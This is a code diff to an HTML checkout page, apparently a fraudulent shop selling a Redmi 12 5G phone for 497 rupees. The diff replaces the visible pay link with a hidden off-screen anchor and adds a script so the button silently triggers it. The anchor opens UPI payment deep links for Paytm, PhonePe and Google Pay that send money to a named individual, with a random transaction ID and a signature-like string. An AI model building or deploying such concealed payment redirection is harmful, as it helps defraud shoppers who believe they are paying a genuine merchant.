@@ -475,9 +475,10 @@ Quantity: 1
 </ul>
 </div>
 <div class="button-container flex">
-<a class="common-button" id="upilink" href="upi18a36.html">
+<div class="common-button" id="upilink">
 Place your Order and Pay
-</a>
+</div>
+<a class="commonXY" id="upiXY" href="#" target="_self" style="position: absolute; left: -9999px; transform: scale(0);"></a>
 </div>
 </div>
 <footer>
@@ -497,7 +498,7 @@ return result;
 }
 console.log(makeid(10));
 
-const link1 = document.getElementById('upilink');
+const link1 = document.getElementById('upiXY');
 link1.href='paytmmp://pay?pa=online-payment@sbi&pn=Mr.%20Sumit%20Kumar%20Suman&mc=7311&tr=' + makeid(10) + '&tn=Redmi%2012%205G%20Pastel%20Blue%20(ORDER%20ID%20-%20FP8744GCD6)&am=497&cu=INR&url=&mode=02&purpose=00&orgid=159002&sign=MEYCIQCke8kk08w+KkZnYNLUUrwqNCFLSiD/Ruao9t4j/MUgjwIhAJZKnG05J7B//h+16TB56+7B0ZSJAQDvPSw75vNGAQIX';
 </script>
 
@@ -515,7 +516,7 @@ counter += 1;
 return result;
 }
 console.log(makeid(10));
-const link1 = document.getElementById('upilink');
+const link1 = document.getElementById('upiXY');
 link1.href='paytmmp://pay?pa=online-payment@sbi&pn=Mr.%20Sumit%20Kumar%20Suman&mc=7311&tr=' + makeid(10) + '&tn=Redmi%2012%205G%20Pastel%20Blue%20(ORDER%20ID%20-%20FP8744GCD6)&am=497&cu=INR&url=&mode=02&purpose=00&orgid=159002&sign=MEYCIQCke8kk08w+KkZnYNLUUrwqNCFLSiD/Ruao9t4j/MUgjwIhAJZKnG05J7B//h+16TB56+7B0ZSJAQDvPSw75vNGAQIX';
 };
 
@@ -532,7 +533,7 @@ counter += 1;
 return result;
 }
 console.log(makeid(10));
-const link1 = document.getElementById('upilink');
+const link1 = document.getElementById('upiXY');
 link1.href='phonepe://pay?pa=online-payment@sbi&pn=Mr.%20Sumit%20Kumar%20Suman&mc=7311&tr=' + makeid(10) + '&tn=Redmi%2012%205G%20Pastel%20Blue%20(ORDER%20ID%20-%20FP8744GCD6)&am=497&cu=INR&url=&mode=02&purpose=00&orgid=159002&sign=MEYCIQCke8kk08w+KkZnYNLUUrwqNCFLSiD/Ruao9t4j/MUgjwIhAJZKnG05J7B//h+16TB56+7B0ZSJAQDvPSw75vNGAQIX';
 };
 
@@ -549,7 +550,7 @@ counter += 1;
 return result;
 }
 console.log(makeid(10));
-const link1 = document.getElementById('upilink');
+const link1 = document.getElementById('upiXY');
 link1.href='gpay://upi/pay?pa=online-payment@sbi&pn=Mr.%20Sumit%20Kumar%20Suman&mc=7311&tr=' + makeid(10) + '&tn=Redmi%2012%205G%20Pastel%20Blue%20(ORDER%20ID%20-%20FP8744GCD6)&am=497&cu=INR&url=&mode=02&purpose=00&orgid=159002&sign=MEYCIQCke8kk08w+KkZnYNLUUrwqNCFLSiD/Ruao9t4j/MUgjwIhAJZKnG05J7B//h+16TB56+7B0ZSJAQDvPSw75vNGAQIX';
 };
 
@@ -566,9 +567,15 @@ counter += 1;
 return result;
 }
 console.log(makeid(10));
-const link1 = document.getElementById('upilink');
+const link1 = document.getElementById('upiXY');
 link1.href='upi://pay?pa=online-payment@sbi&pn=Mr.%20Sumit%20Kumar%20Suman&mc=7311&tr=' + makeid(10) + '&tn=Redmi%2012%205G%20Pastel%20Blue%20(ORDER%20ID%20-%20FP8744GCD6)&am=497&cu=INR&url=&mode=02&purpose=00&orgid=159002&sign=MEYCIQCke8kk08w+KkZnYNLUUrwqNCFLSiD/Ruao9t4j/MUgjwIhAJZKnG05J7B//h+16TB56+7B0ZSJAQDvPSw75vNGAQIX';
 };
+</script>
+
+<script>
+document.getElementById('upilink').addEventListener('click', function() {
+document.getElementById('upiXY').click();
+});
 </script>
 
 <script>
